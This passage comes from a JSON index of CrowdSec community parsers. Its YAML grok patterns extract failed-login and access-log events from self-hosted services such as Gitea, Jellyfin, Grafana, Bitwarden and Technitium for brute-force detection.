"aac09fc79ff9c8e3140c06ef341472934188037f18a79e6d57de16599a3e7e29"}}}, "LePresidente/emby-logs": {"content": "onsuccess: next_stage\n#debug: false\nname: LePresidente/emby-logs\ndescription: \"Parse emby logs\"\nfilter: \"evt.Parsed.program == 'emby'\"\nnodes:\n  - grok:\n      pattern: '%{TIMESTAMP_ISO8601:timestamp}.*?AUTH-ERROR: %{IP:source_ip} - Invalid username or password entered\\.$'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: emby_failed_auth\n\nstatics:\n    - meta: service\n      value: emby\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp", "description": "Parse emby logs", "path": "parsers/s01-parse/LePresidente/emby-logs.yaml", "stage": "s01-parse", "version": "0.3", "versions": {"0.1": {"digest": "e4721455bd2732edce9a185498f865f42eaa945c76de2fc62666ecbcc8257aff"}, "0.2": {"digest": "a059a5f6bd938262e7775f158a6a4fe0902ae44e0f4d853285613553be7ea236"}, "0.3": {"digest": "60d30153bb280d5f3dfe1c16b3094e7e043200c379b7667b8fe1c19dba653978"}}}, "LePresidente/gitea-logs": {"content": "onsuccess: next_stage\n#debug: false\nname: LePresidente/gitea-logs\nfilter: \"evt.Parsed.program == 'gitea'\"\ndescription: \"Parse gitea logs\"\npattern_syntax:\n  GITEA_CUSTOMUSER: \"(%{EMAILADDRESS}|%{USERNAME})\"\n  GITEA_CUSTOMDATE: \"%{DATE_X} %{TIME}\"\nnodes:\n  - grok:\n      pattern: '^%{GITEA_CUSTOMDATE:timestamp}.*?Failed authentication attempt for %{GITEA_CUSTOMUSER:username} from %{IP:remote_ip}:%{NUMBER:remote_port}.* user does not exist'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: gitea_failed_auth\n  - grok:\n      pattern: '^%{GITEA_CUSTOMDATE:timestamp}.*?Failed authentication attempt for %{GITEA_CUSTOMUSER:username} from \\[%{IP:remote_ip}\\].* user does not exist' \n      apply_on: message\n      statics:\n        - meta: log_type\n          value: gitea_failed_auth\n  - grok:\n      pattern: '^%{GITEA_CUSTOMDATE:timestamp}.*?Failed authentication attempt from %{IP:remote_ip}:%{NUMBER:remote_port}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: gitea_failed_auth\n  - grok:\n      pattern: '^%{GITEA_CUSTOMDATE:timestamp}.*?Failed authentication attempt from \\[%{IP:remote_ip}\\]'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: gitea_failed_auth\n  - grok:\n      pattern: \"^%{GITEA_CUSTOMDATE:timestamp}.*?Failed authentication attempt for %{GITEA_CUSTOMUSER:username} from %{IP:remote_ip}:%{NUMBER:remote_port}.* user's password is invalid\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: gitea_failed_auth\n  - grok:\n      pattern: \"^%{GITEA_CUSTOMDATE:timestamp}.*?Failed authentication attempt for %{GITEA_CUSTOMUSER:username} from %{IP:remote_ip}:%{NUMBER:remote_port}.* (user|Email address) does not exist\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: gitea_failed_auth\n\nstatics:\n    - meta: service\n      value: gitea\n    - meta: user\n      expression: \"evt.Parsed.username\"\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp\n    - meta: source_ip\n      expression: \"evt.Parsed.remote_ip\"\n", "description": "Parse gitea logs", "path": "parsers/s01-parse/LePresidente/gitea-logs.yaml", "stage": "s01-parse", "version": "0.8", "versions": {"0.1": {"digest": "61733cf559c01d68ad3ee7d571c836273a0f26e03d1ac7d3b6c5f80783f802de"}, "0.2": {"digest": "784d48685704bc9645dd7ee8bd9fa96b7c0dcdd3234cab06fc51770e21e44312"}, "0.3": {"digest": "67f28ca6777dd1e64723ed3e6a70624d371f3ddd780e5f8fea5c9fa447441c55"}, "0.4": {"digest": "23eb7133e86141d6cedc0b37ec89c43f7a4843b767d0b0c6b565be148040add7"}, "0.5": {"digest": "463f551deeea42713d1b5e15767ac5da484bb65dbf951eddba53059899fd4ab6"}, "0.6": {"digest": "99503f178fab36023d24660674b19059cb903dcbf11d516fa9acaec26185d3a0"}, "0.7": {"digest": "4586255da9713d8ef92253fdcc4a70d475c70e4fa222c0c205a2d7120afea768"}, "0.8": {"digest": "0937ebd8c2cb4808f3fdd02c3be9f608c67f5794f986bb6231ee94a109c2e3cc"}}}, "LePresidente/grafana-logs": {"content": "#debug: false\nname: LePresidente/grafana-logs\nfilter: \"evt.Parsed.program == 'grafana'\"\ndescription: \"Parse grafana logs\"\npattern_syntax:\n  GRAFANA_AUTH_WORD: (Unauthorized|Invalid|Successful)\nnodes:\n  ## Main parsing section either it key value pairs or JSON\n  - filter: TrimSpace(evt.Parsed.message) not startsWith \"{\" && ParseKV(evt.Parsed.message, evt.Unmarshaled, \"grafana\") in [\"\", nil]\n    statics:\n      - meta: log_format\n        value: CLF\n  - filter: evt.Unmarshaled.grafana == nil && UnmarshalJSON(evt.Parsed.message, evt.Unmarshaled, \"grafana\") in [\"\", nil]\n    statics:\n      - meta: log_format\n        value: JSON\n\n ## Detect msg contans authentication attempt to parse out user info\n  - grok:\n      pattern: \"%{GRAFANA_AUTH_WORD:auth_status}( username or password)?\" \n      expression: evt.Unmarshaled.grafana.msg\n    statics:\n      - meta: log_type\n        expression: 'evt.Parsed.auth_status == \"Unauthorized\" || evt.Parsed.auth_status == \"Invalid\"  ? \"auth_failed\" : \"auth_success\"'\n  \n  ## We filter to see if we have a log_type set from above, if not we detect if new log format\n  - filter: evt.Meta.log_type == ''\n    statics:\n      - meta: log_type\n        expression: 'evt.Unmarshaled.grafana.errorMessageID == \"password-auth.failed\" && evt.Unmarshaled.grafana.errorReason in [\"Unauthorized\", \"Invalid\"] ? \"auth_failed\" : \"auth_success\"'\n\n  ## This section is a hack to allow all grafana logs to pass to next stage, if you set onsuccess next stage at root level all successful attempts will not be passed, so we could do some impossible trave sceanrios\n  - filter: evt.Unmarshaled.grafana != nil\n    onsuccess: next_stage\n    statics:\n      - meta: service\n        value: grafana\nstatics:\n    - target: evt.StrTime\n      expression: evt.Unmarshaled.grafana.t\n    - meta: source_ip\n      expression: evt.Unmarshaled.grafana.remote_addr\n", "description": "Parse grafana logs", "path": "parsers/s01-parse/LePresidente/grafana-logs.yaml", "stage": "s01-parse", "version": "0.4", "versions": {"0.1": {"digest": "48c4f8429a9f158676fe5a9aef3fe32f3cd4972072a085527e773b9042385f95"}, "0.2": {"digest": "dee3c33a24ca056cf3106bdfbf6ab9535160d607f276a0c0bf9026645430cd51"}, "0.3": {"digest": "f0383cee1040d2b1a43e32d7849be73e14cf56f568c8a713c7a8305e717b1e2c"}, "0.4": {"digest": "12d4ba5553b214669f8609cf4fc2253c6dc288590d1da56550b7b6417d648cb7"}}}, "LePresidente/harbor-logs": {"content": "onsuccess: next_stage\ndebug: false\nname: LePresidente/harbor-logs\nfilter: \"evt.Parsed.program == 'harbor'\"\ndescription: \"Parse Harbor logs\"\npattern_syntax:\n  HARBOR_CUSTOMUSER: \"(%{EMAILADDRESS}|%{USERNAME})\"\nnodes:\n  - grok:\n      pattern: '.*core\\[%{GREEDYDATA:PID}\\]: %{RFC3339:timestamp} \\[%{GREEDYDATA:ERROR}\\] .*\\[client IP=\"%{IP:remote_ip}, %{IP:internal_ip}\".*failed to authenticate user:%{HARBOR_CUSTOMUSER:username}, error:Failed to authenticate user, due to error \\SInvalid credentials\\S'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: harbor_failed_auth\nstatics:\n    - meta: service\n      value: harbor\n    - meta: user\n      expression: \"evt.Parsed.username\"\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp\n    - meta: source_ip\n      expression: \"evt.Parsed.remote_ip\"", "description": "Parse Harbor logs", "path": "parsers/s01-parse/LePresidente/harbor-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "2f93b00888095bfe2ffe8c69bd4cf7ad33f3ce22c2fd416f5aa8fffb13b29b91"}}}, "LePresidente/jellyfin-logs": {"content": "onsuccess: next_stage\n#debug: false\nname: LePresidente/jellyfin-logs\ndescription: \"Parse jellyfin logs\"\nfilter: \"evt.Parsed.program == 'jellyfin'\"\npattern_syntax:\n  JELLYFIN_CUSTOMUSER: \"(%{EMAILADDRESS}|%{USERNAME})\"\n  JELLYFIN_CUSTOMDATE: \"%{YEAR}-%{MONTHNUM}-%{MONTHDAY} %{HOUR}:%{MINUTE}:%{SECOND}\"\nnodes:\n  - grok:\n      pattern: '(\\[%{JELLYFIN_CUSTOMDATE:timestamp}.*\\])?.*Authentication request for \"?%{JELLYFIN_CUSTOMUSER:username}\"? has been denied \\(IP: \"?%{IP:source_ip}\"?\\).*'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: jellyfin_failed_auth\n\nstatics:\n    - meta: service\n      value: jellyfin\n    - meta: user\n      expression: \"evt.Parsed.username\"\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp\n", "description": "Parse jellyfin logs", "path": "parsers/s01-parse/LePresidente/jellyfin-logs.yaml", "stage": "s01-parse", "version": "0.6", "versions": {"0.1": {"digest": "84040848391d95ee8157b897936c52044ebf1c617fb7afb7b5dacbdc23cf0026"}, "0.2": {"digest": "30e1fd118ce846ab35a7948f8f22a80cf8a7687a8eea65f31af1d053a9be7908"}, "0.3": {"digest": "9752de75a0ee0b01a24ea373b9e3728dddcf98bea6c8495d1cf19632bc5ea4a0"}, "0.4": {"digest": "00711c44397b26c09da3846696c07b7bc9b7c87de7ccce0d80027b15da7c952c"}, "0.5": {"digest": "054003047bc134d7904ad4528c7701ea92eb8e28f307f37e9d7e3b2d4e4e27cc"}, "0.6": {"digest": "bd3285739600306f8b92aeeb0f32fbafd3146434746b60ba7344182acd46b1d1"}}}, "LePresidente/jellyseerr-logs": {"content": "onsuccess: next_stage\n#debug: false\nname: LePresidente/jellyseerr-logs\ndescription: \"Parse jellyseerr logs\"\nfilter: \"evt.Parsed.program == 'jellyseerr'\"\npattern_syntax:\n  JELLYSEERR_CUSTOMUSER: \"(%{EMAILADDRESS}|%{USERNAME})\"\nnodes:\n  - grok:\n      pattern: '%{RFC3339:timestamp}.*Failed sign-in attempt using invalid .* password.*{\"ip\":\"::ffff:%{IP:source_ip}\",\"email\":\"%{JELLYSEERR_CUSTOMUSER:username}\"}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: jellyseerr_failed_auth\n  - grok:\n      pattern: '%{RFC3339:timestamp}.*Failed login attempt from user with incorrect.*credentials {\"account\":{\"ip\":\"::ffff:%{IP:source_ip}\",\"email\":\"%{JELLYSEERR_CUSTOMUSER:username}\",\"password\":\"__REDACTED__\"}}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: jellyseerr_failed_auth\n  - grok:\n      pattern: '%{RFC3339:timestamp}.*Failed sign-in attempt using invalid .* password.*{\"ip\":\"%{IP:source_ip}\",\"email\":\"%{JELLYSEERR_CUSTOMUSER:username}\"}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: jellyseerr_failed_auth\n  - grok:\n      pattern: '%{RFC3339:timestamp}.*Failed login attempt from user with incorrect.*credentials {\"account\":{\"ip\":\"%{IP:source_ip}\",\"email\":\"%{JELLYSEERR_CUSTOMUSER:username}\",\"password\":\"__REDACTED__\"}}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: jellyseerr_failed_auth\n\nstatics:\n    - meta: service\n      value: jellyseerr\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - meta: user\n      expression: \"evt.Parsed.username\"\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp", "description": "Parse jellyseerr logs", "path": "parsers/s01-parse/LePresidente/jellyseerr-logs.yaml", "stage": "s01-parse", "version": "0.3", "versions": {"0.1": {"digest": "7d41498c0683ae655c3a6dcd35b9bcd8986cbe73fc4567fd09ffdf12ca3d8176"}, "0.2": {"digest": "8db12c71262bc7ea91380d2ba1387efbb932c4c384b65945b017201442ca1f18"}, "0.3": {"digest": "9a045612d84da761d7bbb603a392f3e1fe86ad7f7021a5869a300e79f9656676"}}}, "LePresidente/ombi-logs": {"content": "onsuccess: next_stage\n#debug: false\nname: LePresidente/ombi-logs\ndescription: \"Parse ombi logs\"\nfilter: \"evt.Parsed.program == 'ombi'\"\nnodes:\n  - grok:\n      pattern: '%{TIMESTAMP_ISO8601:timestamp}.*?Failed login attempt by IP: %{IP:source_ip}'\n      \n      apply_on: message\n      statics:\n        - meta: log_type\n          value: ombi_auth_failed\n\nstatics:\n    - meta: service\n      value: ombi\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp", "description": "Parse ombi logs", "path": "parsers/s01-parse/LePresidente/ombi-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "349a5cf885c37a19465568ffdd1951677c0a9c9657cfa2fcd952d07899b1166d"}, "0.2": {"digest": "a0cb8745d077d692586d36eb64b052a139666d26bc04f4a48cd72575eab714d1"}}}, "LePresidente/overseerr-logs": {"content": "onsuccess: next_stage\n#debug: false\nname: LePresidente/overseerr-logs\ndescription: \"Parse Overseerr logs\"\nfilter: \"evt.Parsed.program == 'overseerr'\"\npattern_syntax:\n  OVERSEERR_CUSTOMUSER: \"(%{EMAILADDRESS}|%{USERNAME})\"\nnodes:\n  - grok:\n      pattern: '(%{RFC3339:timestamp})?.*Failed sign-in attempt using invalid .* password.*{\"ip\":\"::ffff:%{IP:source_ip}\",\"email\":\"%{OVERSEERR_CUSTOMUSER:username}\"}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: overseerr_failed_auth\n  - grok:\n      pattern: '(%{RFC3339:timestamp})?.*Failed login attempt from user with incorrect.*credentials {\"account\":{\"ip\":\"::ffff:%{IP:source_ip}\",\"email\":\"%{OVERSEERR_CUSTOMUSER:username}\",\"password\":\"__REDACTED__\"}}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: overseerr_failed_auth\n  - grok:\n      pattern: '(%{RFC3339:timestamp})?.*Failed sign-in attempt using invalid .* password.*{\"ip\":\"%{IP:source_ip}\",\"email\":\"%{OVERSEERR_CUSTOMUSER:username}\"}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: overseerr_failed_auth\n  - grok:\n      pattern: '(%{RFC3339:timestamp})?.*Failed login attempt from user with incorrect.*credentials {\"account\":{\"ip\":\"%{IP:source_ip}\",\"email\":\"%{OVERSEERR_CUSTOMUSER:username}\",\"password\":\"__REDACTED__\"}}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: overseerr_failed_auth\nstatics:\n    - meta: service\n      value: overseerr\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - meta: user\n      expression: \"evt.Parsed.username\"\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp", "description": "Parse Overseerr logs", "path": "parsers/s01-parse/LePresidente/overseerr-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "950272a8e13047975401e52f4c4a7f30e422baa6b88251889b24b6601a21c33c"}}}, "LePresidente/redmine-logs": {"content": "onsuccess: next_stage\n#debug: false\nname: LePresidente/redmine-logs\ndescription: \"Parse redmine logs\"\nfilter: \"evt.Parsed.program == 'redmine'\"\npattern_syntax:\n  REDMINE_CUSTOMUSER: \"(%{EMAILADDRESS}|%{USERNAME})\"\nnodes:\n  - grok:\n      pattern: '\\[%{TIMESTAMP_ISO8601:timestamp} .*\\]  %{LOGLEVEL:loglevel} .*: Failed login for \\S%{REDMINE_CUSTOMUSER:username}\\S from %{IP:source_ip} at %{GREEDYDATA:date}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: redmine_failed_auth\n\nstatics:\n    - meta: service\n      value: redmine\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - target: evt.StrTime\n      expression: \"evt.Parsed.timestamp + \\\"Z\\\"\"", "description": "Parse redmine logs", "path": "parsers/s01-parse/LePresidente/redmine-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "69f706a808d2a540156b99e97467094be2432943daa8160743f3109862caa9c9"}, "0.2": {"digest": "ff08869d0519145d891910430ec64e9075185190400c803babc1d67f9ee29b5e"}}}, "LearningSpot/baserow-logs": {"content": "name: LearningSpot/baserow-logs\ndescription: \"Parse Baserow login logs\"\nfilter: \"evt.Parsed.program == 'baserow'\"\nonsuccess: next_stage\nnodes:\n  - grok:\n      pattern: '^ \\[BACKEND\\]\\[%{TIMESTAMP_ISO8601:timestamp}\\] %{IP:source_ip}:%{NUMBER:length} - \"POST /api/user/token-auth/ HTTP/1.1\" %{NUMBER:status}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: baserow_failed_login\nstatics:\n  - meta: service\n    value: baserow\n  - meta: source_ip\n    expression: evt.Parsed.source_ip\n  - meta: status\n    expression: evt.Parsed.status\n  - target: evt.StrTime\n    expression: evt.Parsed.timestamp\n", "description": "Parse Baserow login logs", "path": "parsers/s01-parse/LearningSpot/baserow-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "94977453bdd9b7de37e794f9b1b041db4355789153fe9e18bb6ab497cac03463"}}}, "LearningSpot/dockge-logs": {"content": "name: LearningSpot/dockge-logs\ndescription: \"Parse Dockge Logs\"\nfilter: \"evt.Parsed.program == 'dockge'\"\nonsuccess: next_stage\nnodes:\n - grok:\n     pattern: '%{TIMESTAMP_ISO8601:timestamp} \\[AUTH\\] WARN: Incorrect username or password for user %{DATA:username}.? IP=%{IP:source_ip}'\n     apply_on: message\n     statics:\n       - meta: log_type\n         value: dockge_failed_auth\n       - target: evt.StrTime\n         expression: evt.Parsed.timestamp\n       - meta: username\n         expression: evt.Parsed.username\nstatics:\n   - meta: service\n     value: dockge\n   - meta: source_ip\n     expression: evt.Parsed.source_ip\n", "description": "Parse Dockge Logs", "path": "parsers/s01-parse/LearningSpot/dockge-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "3136280c368742e7461876b047bda1255bc6dcd2f005286c83c1ad801728fbba"}, "0.2": {"digest": "9a828d1c9cfa85cf943c308ba1668d2b2b673c3b54cb755ef0b42333c282b99c"}}}, "LearningSpot/hestiacp-logs": {"content": "name: LearningSpot/hestiacp-logs\ndescription: \"Parse Hestiacp Logs\"\nfilter: \"evt.Parsed.program == 'hestiacp'\"\nonsuccess: next_stage\nnodes:\n - grok:\n     pattern: '%{TIMESTAMP_ISO8601:timestamp} %{USERNAME:username} %{IP:source_ip} failed to login'\n     apply_on: message\n     statics:\n       - meta: log_type\n         value: hestiacp_failed_auth\nstatics:\n   - meta: service\n     value: hestiacp\n   - meta: source_ip\n     expression: evt.Parsed.source_ip\n   - target: evt.StrTime\n     expression: evt.Parsed.timestamp\n   - meta: target_user\n     expression: evt.Parsed.username\n", "description": "Parse Hestiacp Logs", "path": "parsers/s01-parse/LearningSpot/hestiacp-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "a5b1583956e32b8053137de484221adec195817dce1ccf5021fc09ef95825205"}}}, "LearningSpot/litellm-logs": {"content": "name: LearningSpot/litellm-logs\ndescription: \"Parse Litellm login logs\"\nfilter: \"evt.Parsed.program == 'litellm'\"\nonsuccess: next_stage\nnodes:\n  - grok:\n      pattern: 'INFO:%{SPACE}%{IP:source_ip}:%{INT} - \"%{WORD:method} %{DATA:query} %{URIPROTO}/%{NUMBER:http_version}\" %{NUMBER:status} Unauthorized'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: litellm_failed_auth\nstatics:\n  - meta: service\n    value: litellm\n  - target: source_ip\n    expression: evt.Parsed.source_ip\n  - meta: status\n    expression: evt.Parsed.status\n", "description": "Parse Litellm login logs", "path": "parsers/s01-parse/LearningSpot/litellm-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "cfafbd9bd2278d66c5e578736c1f83013361b2f9fc86654887fb0984e833deec"}}}, "MariuszKociubinski/bitwarden-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program == 'bitwarden'\"\nname: MariuszKociubinski/bitwarden-logs\ndescription: \"Parse bitwarden logs\"\ndebug: false\npattern_syntax:\n  BITWARDEN_FAILED_LOGIN: '^%{EXIM_DATE:timestamp}.*Failed login attempt\\. %{IP:source_ip}.*$'\n  BITWARDEN_FAILED_LOGIN_2FA: '^%{EXIM_DATE:timestamp}.*Failed login attempt\\, 2FA invalid\\. %{IP:source_ip}.*$'\nnodes:\n  - grok:\n      name: BITWARDEN_FAILED_LOGIN  \n      apply_on: message\n      statics:\n        - meta: log_type\n          value: bitwarden_failed_auth\n  - grok:\n      name: BITWARDEN_FAILED_LOGIN_2FA\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: bitwarden_failed_auth_2fa\nstatics:\n    - meta: service\n      value: bitwarden\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n", "description": "Parse bitwarden logs", "path": "parsers/s01-parse/MariuszKociubinski/bitwarden-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "8c83d0c40242678340f1f96e27ae3e17e9d258ab0cff9b112c8312cec8609995"}}}, "MrShippeR/filebrowser-logs": {"content": "name: MrShippeR/filebrowser-logs\ndescription: \"Parse Filebrowser authentication failures\"\nonsuccess: next_stage\nfilter: \"evt.Parsed.program == 'filebrowser'\"\n\npattern_syntax:\n  FILEBROWSER_FAILED_AUTH: \"%{NGINXERRTIME:event_timestamp} /api/login: 403 %{IP:source_ip} <nil>\"\n\nnodes:\n  - grok:\n      name: \"FILEBROWSER_FAILED_AUTH\"\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: filebrowser_failed_auth\n        - meta: log_subtype\n          value: filebrowser_invalid_credentials\n        - target: evt.StrTime\n          expression: evt.Parsed.event_timestamp\n\n\nstatics:\n  - meta: service\n    value: filebrowser\n  - meta: source_ip\n    expression: \"evt.Parsed.source_ip\"\n  - meta: timestamp\n    expression: \"evt.StrTime\"\n", "description": "Parse Filebrowser authentication failures", "path": "parsers/s01-parse/MrShippeR/filebrowser-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "0516090f21565c88ff996903cdec817d982a9734a69edd532fd9e913c40e3e58"}, "0.2": {"digest": "9557990a686183167be8b9ff2559ca19c1ef22599fac4461dc4ddda1ff53b423"}}}, "PintjesB/technitium-logs": {"content": "name: PintjesB/technitium-logs\ndescription: \"Parse Technitium auth logs\"\nonsuccess: next_stage\nfilter: evt.Parsed.program == 'technitium'\npattern_syntax:\n  TECHNITIUM_DATETIME: '%{YEAR:year}-%{MONTHNUM:month}-%{MONTHDAY:day} %{TIME:time} %{TZ}'\nnodes:\n  - grok:\n      pattern: '^\\[%{TECHNITIUM_DATETIME}\\] \\[%{IP:source_ip}:%{INT:source_port}\\] DnsServerCore.DnsWebServiceException: Invalid username or password for user: %{USERNAME:username}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: technitium_failed_auth\n\nstatics:\n  - meta: service\n    value: technitium\n  - target: evt.StrTime\n    expression: \"evt.Parsed.year + '/' + evt.Parsed.month + '/' + evt.Parsed.day + ' ' + evt.Parsed.time\"\n  - meta: source_ip\n    expression: \"evt.Parsed.source_ip\"\n  - meta: source_port\n    expression: \"evt.Parsed.source_port\"\n  - meta: username\n    expression: \"evt.Parsed.username\"", "description": "Parse Technitium auth logs", "path": "parsers/s01-parse/PintjesB/technitium-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "dcebe28fe123eccd5bd8a28fa4ce49f2ae6162e51f81da41840e6fb97d922d99"}}}, "Raithmir/zoraxy-logs": {"content": "name: Raithmir/zoraxy-logs\ndescription: \"Parse Zoraxy logs\"\nfilter: \"evt.Parsed.program == 'zoraxy'\"\nonsuccess: next_stage\n#debug: true\nnodes:\n - grok:\n     pattern: '\\[%{TIMESTAMP_ISO8601:time_stamp}\\] \\[router:(?:host-http|whitelist|blacklist|subdomain-http|host-websocket|vdir-http|vdir-websocket|redirect|root-no_resp)\\] \\[origin:%{IPORHOST:target_server}?\\] \\[client: %{IPORHOST:remote_addr}\\] \\[useragent: %{DATA:http_user_agent}\\] %{WORD:verb} %{DATA:request} %{NUMBER:status}'\n     apply_on: message\n     statics:\n       - meta: log_type\n         value: http_access-log\n       - target: evt.StrTime\n         expression: evt.Parsed.time_stamp\n\nstatics:\n   - meta: service\n     value: http\n   - meta: source_ip\n     expression: evt.Parsed.remote_addr\n   - meta: http_status\n     expression: evt.Parsed.status\n   - meta: http_path\n     expression: evt.Parsed.request\n   - meta: http_verb\n     expression: evt.Parsed.verb\n   - meta: http_user_agent\n     expression: evt.Parsed.http_user_agent\n   - meta: target_fqdn\n     expression: evt.Parsed.target_server\n", "description": "Parse Zoraxy logs", "path": "parsers/s01-parse/Raithmir/zoraxy-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "219376f3928e15a6c7c7a5741c9171e78cda3fa104780d9e04279dd75b2c2913"}}}, "Zaulao/aws-alb": {"content": "onsuccess: next_stage\nfilter: \"evt.Line.Labels.type == 'aws-alb'\"\nname: crowdsecurity/aws-alb\ndescription: \"Parse AWS ALB access logs\"\ngrok:\n  pattern: '%{DATA:type}\\s+%{TIMESTAMP_ISO8601:time}\\s+%{DATA:elb}\\s+%{IP:remote_addr}:%{BASE10NUM:remote_port}\\s+(-|(%{IP:target_addr}:%{BASE10NUM:target_port}))\\s+%{BASE10NUM:request_processing_time}\\s+%{DATA:target_processing_time}\\s+%{BASE10NUM:response_processing_time}\\s+%{BASE10NUM:elb_status_code}\\s+%{DATA:target_status_code}\\s+%{BASE10NUM:received_bytes}\\s+%{BASE10NUM:sent_bytes}\\s+\\\"%{WORD:verb}\\s+%{DATA:protocol}://%{DATA:host}:%{NUMBER:port}%{DATA:request}\\s+HTTP/%{NUMBER:http_version}\\\"\\s+\\\"%{DATA:http_user_agent}\\\"\\s+%{DATA:ssl_cipher}\\s+%{DATA:ssl_protocol}\\s+%{DATA:target_group_arn}\\s+\\\"%{DATA:trace_id}\\\"\\s+\\\"%{DATA:domain_name}\\\"\\s+\\\"%{DATA:chosen_cert_arn}\\\"\\s+%{DATA:matched_rule_priority}\\s+%{TIMESTAMP_ISO8601:request_creation_time}\\s+\\\"%{DATA:actions_executed}\\\"\\s+\\\"%{DATA:redirect_url}\\\"\\s+\\\"%{DATA:error_reason}\\\"\\s+\\\"%{DATA:target_list}\\\"\\s+\\\"%{DATA:target_status_code_list}\\\"\\s+\\\"%{DATA:classification}\\\"\\s+\\\"%{DATA:classification_reason}\\\"'\n  apply_on: Line.Raw\n  statics:\n    - meta: log_type\n      value: alb_access_log\nstatics:\n    - meta: service\n      value: http\n    - meta: log_type\n      value: http_access-log\n    - target: evt.StrTime\n      expression: evt.Parsed.request_creation_time\n    - meta: source_ip\n      expression: \"evt.Parsed.remote_addr\"\n    - meta: http_status\n      expression: \"evt.Parsed.elb_status_code\"\n    - meta: http_host\n      expression: \"evt.Parsed.host\"\n    - meta: http_port\n      expression: \"evt.Parsed.port\"\n    - meta: http_path\n      expression: \"evt.Parsed.request\"\n    - meta: http_verb\n      expression: \"evt.Parsed.verb\"\n    - meta: http_user_agent\n      expression: \"evt.Parsed.http_user_agent\"", "description": "Parse AWS ALB access logs", "path": "parsers/s01-parse/Zaulao/aws-alb.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "9ba7ab74a72e7090f14d62fb95795f98be37ea981ff3de4464a8cad3b9a1747f"}, "0.2": {"digest": "bfa48a63ec4ffd89913aec70b9b33dfde22ea49a15de087dc0cb19bed8e06d9e"}}}, "ZoeyVid/npmplus-logs": {"content": "filter: \"evt.Parsed.program startsWith 'npmplus'\"\nonsuccess: next_stage\nname: ZoeyVid/npmplus-logs\ndescription: \"Parse NPMplus access and error logs\"\npattern_syntax:\n  NPMPLUSFQDN: '%{IPORHOST}||%{DATA}'\nnodes:\n  - grok:\n      pattern: '\\[%{HTTPDATE:time_local}\\] %{NPMPLUSFQDN:target_fqdn} %{IPORHOST:remote_addr} %{NUMBER:request_time} \"%{WORD:verb} %{DATA:request} HTTP/%{NUMBER:http_version}\" %{NUMBER:status} %{NUMBER:body_bytes_sent} %{NUMBER:bytes_sent} %{DATA:http_referer} %{GREEDYDATA:http_user_agent}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: http_access-log\n        - target: evt.StrTime\n          expression: evt.Parsed.time_local\n  - grok:\n      # and this one the error log\n      pattern: '(%{IPORHOST:target_fqdn} )?%{NGINXERRTIME:time} \\[%{LOGLEVEL:loglevel}\\] %{NONNEGINT:pid}#%{NONNEGINT:tid}: (\\*%{NONNEGINT:cid} )?%{GREEDYDATA:message}, client: %{IPORHOST:remote_addr}, server: %{DATA:target_fqdn}, request: \"%{WORD:verb} ([^/]+)?%{URIPATHPARAM:request}( HTTP/%{NUMBER:http_version})?\", host: \"%{IPORHOST}(:%{NONNEGINT})?\"'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: http_error-log\n        - target: evt.StrTime\n          expression: evt.Parsed.time\n    pattern_syntax:\n      NO_DOUBLE_QUOTE: '[^\"]+'\n    onsuccess: next_stage\n    nodes:\n      - filter: \"evt.Parsed.message contains 'was not found in'\"\n        pattern_syntax:\n          USER_NOT_FOUND: 'user \"%{NO_DOUBLE_QUOTE:username}\" was not found in \"%{NO_DOUBLE_QUOTE}\"'\n        grok:\n          pattern: '%{USER_NOT_FOUND}'\n          apply_on: message\n        